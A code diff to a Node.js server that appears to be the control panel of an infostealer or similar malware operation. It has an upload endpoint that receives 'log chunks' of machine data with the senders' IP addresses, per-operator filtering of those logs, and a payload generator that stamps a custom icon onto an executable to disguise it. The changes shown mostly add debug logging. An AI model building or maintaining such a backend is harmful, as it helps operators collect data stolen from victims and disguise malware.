@@ -470,13 +470,28 @@ app.get('/api/logs', authenticateToken, (req, res) => {
             // If log has no user field or user is null/empty, show it only to "account" user (for backward compatibility)
             const logUser = log.user;
             if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
-                return username === 'account';
+                const matches = username === 'account';
+                if (!matches && allLogs.length <= 10) {
+                    console.log(`  Log ${log.id}: no user field, showing only to 'account' user (logged in as: ${username})`);
+                }
+                return matches;
             }
-            // Show log if user matches
-            return logUser === username;
+            // Show log if user matches (case-sensitive exact match)
+            const matches = logUser === username;
+            if (!matches && allLogs.length <= 10) {
+                console.log(`  Log ${log.id}: user="${logUser}" !== username="${username}" (no match)`);
+            } else if (matches && allLogs.length <= 10) {
+                console.log(`  Log ${log.id}: user="${logUser}" === username="${username}" (MATCH)`);
+            }
+            return matches;
         });
         
-        console.log(`Filtered logs for user ${username}: ${logs.length} logs found (from ${allLogs.length} total)`);
+        console.log(`Filtered logs for user "${username}": ${logs.length} logs found (from ${allLogs.length} total)`);
+        if (logs.length === 0 && allLogs.length > 0) {
+            console.log(`⚠️  WARNING: No logs matched username "${username}". Check if payload was generated with this exact username.`);
+            console.log(`   Available users in database: ${Object.keys(userCounts).join(', ')}`);
+            console.log(`   To see these logs, you need to log in with one of these usernames: ${Object.keys(userCounts).filter(u => u !== 'null').join(', ')}`);
+        }
         
         res.json(logs);
     } catch (error) {
@@ -580,8 +595,10 @@ app.post('/api/upload', (req, res) => {
         if (!user || user === null || user === '') {
             console.log(`⚠️  WARNING: Received log chunk with no user field - session: ${sessionId || 'none'}, IP: ${ip}`);
             console.log(`   This log will only be visible to 'account' user. Make sure payload was generated with correct username.`);
+            console.log(`   Full pcData keys: ${Object.keys(pcData || {}).join(', ')}`);
         } else {
-            console.log(`Received log chunk - user: ${user}, session: ${sessionId || 'none'}, IP: ${ip}`);
+            console.log(`✓ Received log chunk - user: "${user}", session: ${sessionId || 'none'}, IP: ${ip}`);
+            console.log(`  This log will be visible to user "${user}" when they log in`);
         }
         
         const logData = {
@@ -1303,7 +1320,7 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
                 tempExePath = path.join(os.tmpdir(), `payload-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.exe`);
                 fs.copyFileSync(payloadPath, tempExePath);
                 
-                // Apply the icon using rcedit
+                // Apply the icon using rcedit meow meow
                 try {
                     await applyIconToExe(tempExePath, iconPath);
                     console.log('Custom icon applied successfully');
